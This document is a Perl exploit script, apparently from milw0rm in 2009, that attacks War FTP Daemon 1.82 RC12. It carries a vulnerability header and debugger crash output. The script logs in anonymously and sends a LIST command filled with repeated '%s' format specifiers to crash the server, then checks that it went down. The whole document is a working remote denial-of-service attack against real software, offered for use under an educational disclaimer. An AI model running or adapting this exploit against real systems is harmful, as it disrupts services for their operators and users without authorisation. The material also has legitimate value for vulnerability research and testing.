# [*] Vulnerability     : War FTP Daemon Format String DoS (LIST command)
# [*] Detected by       : corelanc0d3r (corelanc0d3r[at]gmail[dot]com)
# [*] Type              : remote DoS
# [*] OS                : Windows
# [*] Product           : Jgaa's War FTP Daemon
# [*] Versions affected : 1.82 RC 12 
# [*] Download link     : http://www.warftp.org/?menu=344
# [*] -------------------------------------------------------------------------
# [*] Method            : format string, only works with anonymous access
# [*] Crash information
#(8cc.598): Access violation - code c0000005 (!!! second chance !!!)
#eax=00000001 ebx=0076e7b0 ecx=00000073 edx=00000002 esi=0076e6fe edi=0000000a
#eip=00431680 esp=0076e6c0 ebp=00a1114a iopl=0         nv up ei pl nz na po nc
#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202

#war_ftpd+0x31680:
#00431680 8a08            mov     cl,byte ptr [eax]          ds:0023:00000001=??
#0:001> d ebp
#00a1114a  73 25 73 25 73 25 73 25-73 25 73 25 73 25 73 25  s%s%s%s%s%s%s%s%
#00a1115a  73 25 73 25 73 25 73 25-73 25 73 25 73 25 73 25  s%s%s%s%s%s%s%s%
#00a1116a  73 25 73 25 73 25 73 25-73 25 73 25 73 25 73 25  s%s%s%s%s%s%s%s%
#00a1117a  73 25 73 25 73 25 73 25-73 25 73 25 73 25 73 25  s%s%s%s%s%s%s%s%
#00a1118a  73 25 73 25 73 25 73 25-73 25 73 25 73 25 73 25  s%s%s%s%s%s%s%s%
#00a1119a  73 25 73 25 73 25 73 25-73 25 73 25 73 25 73 25  s%s%s%s%s%s%s%s%
#00a111aa  73 25 73 25 73 25 73 25-73 25 73 25 73 25 73 25  s%s%s%s%s%s%s%s%
#00a111ba  73 25 73 25 73 25 73 25-73 25 73 25 73 25 73 25  s%s%s%s%s%s%s%s%
#
#
# [*] Greetz&Tx to      : Saumil/SK/hack4love/str0ke
# [*] -------------------------------------------------------------------------
#                                               MMMMM~.                          
#                                               MMMMM?.                          
#    MMMMMM8.  .=MMMMMMM.. MMMMMMMM, MMMMMMM8.  MMMMM?. MMMMMMM:   MMMMMMMMMM.   
#  MMMMMMMMMM=.MMMMMMMMMMM.MMMMMMMM=MMMMMMMMMM=.MMMMM?7MMMMMMMMMM: MMMMMMMMMMM:  
#  MMMMMIMMMMM+MMMMM$MMMMM=MMMMMD$I8MMMMMIMMMMM~MMMMM?MMMMMZMMMMMI.MMMMMZMMMMM:  
#  MMMMM==7III~MMMMM=MMMMM=MMMMM$. 8MMMMMZ$$$$$~MMMMM?..MMMMMMMMMI.MMMMM+MMMMM:  
#  MMMMM=.     MMMMM=MMMMM=MMMMM7. 8MMMMM?    . MMMMM?NMMMM8MMMMMI.MMMMM+MMMMM:  
#  MMMMM=MMMMM+MMMMM=MMMMM=MMMMM7. 8MMMMM?MMMMM:MMMMM?MMMMMIMMMMMO.MMMMM+MMMMM:  
#  =MMMMMMMMMZ~MMMMMMMMMM8~MMMMM7. .MMMMMMMMMMO:MMMMM?MMMMMMMMMMMMIMMMMM+MMMMM:  
#  .:$MMMMMO7:..+OMMMMMO$=.MMMMM7.  ,IMMMMMMO$~ MMMMM?.?MMMOZMMMMZ~MMMMM+MMMMM:  
#     .,,,..      .,,,,.   .,,,,,     ..,,,..   .,,,,.. .,,...,,,. .,,,,..,,,,.  
#                                                                   eip hunters
# -----------------------------------------------------------------------------
# Script provided 'as is', without any warranty. 
# Use for educational purposes only.
#
#
#
#
use IO::Socket; 
if ($#ARGV ne 1) { 
print "  usage: $0 <targetip> <targetport>\n"; 
exit(0); 
} 

my $user="anonymous";
my $pass="anonymous@me.com";

print " [+] Preparing DoS payload\n";
my $payload=("%s" x 300);
my $payload2 = "A" x 5000;
print " [+] Connecting to server $ARGV[0] on port $ARGV[1]\n";
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0], 
                              PeerPort => $ARGV[1], 
                              Proto    => 'tcp'); 

$ftp = <$sock> || die " [!] *** Unable to connect ***\n"; 
print "   ** $ftp";
$ftp = <$sock>;
print "   ** $ftp";
$ftp = <$sock>;
print "   ** $ftp";
$ftp = <$sock>;
print "   ** $ftp";
print " [+] Logging in (user $user)\n";
print $sock "USER $user\r\n"; 
$ftp = <$sock>;
print "   ** $ftp";
print $sock "PASS $pass\r\n"; 
$ftp = <$sock>;
print "   ** $ftp";
print " [+] Sending payload\n";
print $sock "LIST ".$payload."\r\n";
print $sock "BOOM !\r\n";
print " [+] Payload sent, now checking FTP server state\n";
$sock2 = IO::Socket::INET->new(PeerAddr => $ARGV[0], 
                              PeerPort => $ARGV[1], 
                              Proto    => 'tcp'); 
my $ftp2 = <$sock2> || die " [+] DoS successful\n";
print " [!] DoS did not seem to work\n";
print "   ** $ftp2\n";

# milw0rm.com [2009-09-10]